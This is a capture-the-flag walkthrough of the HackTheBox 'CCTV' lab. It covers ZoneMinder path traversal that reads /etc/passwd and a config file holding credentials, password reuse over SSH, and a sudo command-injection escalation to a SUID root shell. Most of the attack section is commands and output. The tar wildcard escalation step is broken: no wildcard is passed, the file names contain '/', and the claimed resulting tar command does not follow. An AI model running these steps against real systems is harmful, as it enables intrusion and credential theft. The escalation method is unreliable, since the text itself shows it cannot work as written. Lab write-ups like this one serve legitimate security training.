---
title: "HackTheBox CCTV: Full Walkthrough"
date: 2024-10-08
tags: [HTB, Web Security, Privilege Escalation]
thumbnail:
---

## Machine Info

- **Name:** CCTV (cctv.htb)
- **OS:** Linux
- **Difficulty:** Medium
- **Release:** October 2024

> **Spoiler warning:** Full solution below.

---

## Initial Recon

```bash
# Full port scan
nmap -sC -sV -p- --min-rate 5000 10.10.11.X -oA nmap/cctv

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1
80/tcp  open  http     Apache/2.4.52 (Ubuntu)
```

Adding to `/etc/hosts`:
```
10.10.11.X  cctv.htb
```

---

## Web Enumeration

Landing page shows a ZoneMinder CCTV dashboard. Version check:

```bash
curl -s http://cctv.htb/ | grep -i "zoneminder\|version"
# ZoneMinder 1.36.32
```

Googling this version → CVE-2024-51482 (path traversal). Let's exploit.

---

## Foothold via CVE-2024-51482

```bash
# Read /etc/passwd
curl "http://cctv.htb/index.php?view=image&path=/var/cache/zoneminder/../../../etc/passwd"

# Output (truncated):
root:x:0:0:root:/root:/bin/bash
zoneminder:x:1001:1001::/home/zoneminder:/bin/bash
developer:x:1002:1002::/home/developer:/bin/bash
```

Two interesting users: `zoneminder` and `developer`.

```bash
# Check for SSH keys
curl "http://cctv.htb/index.php?view=image&path=/var/cache/zoneminder/../../../home/developer/.ssh/id_rsa"
# No key here

# Check ZoneMinder config
curl "http://cctv.htb/index.php?view=image&path=/var/cache/zoneminder/../../../etc/zm/zm.conf"

# Credentials in config!
ZM_DB_USER=zmuser
ZM_DB_PASS=ZoneMinderPass2024!
```

---

## Credential Reuse

```bash
# Try SSH with database password
ssh developer@cctv.htb
# Password: ZoneMinderPass2024!

# It works!
developer@cctv:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)

# User flag
developer@cctv:~$ cat user.txt
HTB{...}
```

---

## Privilege Escalation

### Enumeration

```bash
# Sudo check
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py

# Read the script
cat /opt/scripts/backup.py
```

```python
#!/usr/bin/env python3
import os
import subprocess
import sys

# Backup script - runs as root
backup_dir = sys.argv[1] if len(sys.argv) > 1 else "/var/backups"
cmd = f"tar -czf /tmp/backup.tar.gz {backup_dir}"

# VULNERABLE: unsanitized input to subprocess shell=True
subprocess.run(cmd, shell=True)
print(f"Backup completed to /tmp/backup.tar.gz")
```

### Exploitation

The script passes our argument directly into a shell command — classic command injection.

```bash
# Exploit: inject command via tar wildcard technique
# Create malicious files in a directory we control
mkdir /tmp/pwn
echo "" > "/tmp/pwn/--checkpoint=1"
echo "" > "/tmp/pwn/--checkpoint-action=exec=bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'"

# Run the backup script with our directory
sudo /usr/bin/python3 /opt/scripts/backup.py /tmp/pwn

# The tar command becomes:
# tar -czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=...

# Execute our SUID bash
/tmp/rootbash -p

# Root!
rootbash-5.1# id
uid=1002(developer) gid=1002(developer) euid=0(root)
rootbash-5.1# cat /root/root.txt
HTB{...}
```

---

## Full Attack Chain Summary

```
CVE-2024-51482 (Path Traversal)
        ↓
Read ZoneMinder config → DB credentials
        ↓
Password reuse → SSH as developer
        ↓
Sudo python3 script → Command injection via tar wildcards
        ↓
SUID bash → Root
```

---

## Key Takeaways

1. **LFI/Path traversal in config files is gold** — always check app configs for credentials
2. **Credential reuse is extremely common** — always try found passwords on SSH
3. **`shell=True` in Python subprocess is dangerous** — never pass unsanitized user input
4. **Tar wildcard injection** — a classic that still works in 2024

---

`root@cctv:~# cat /root/root.txt` ✓
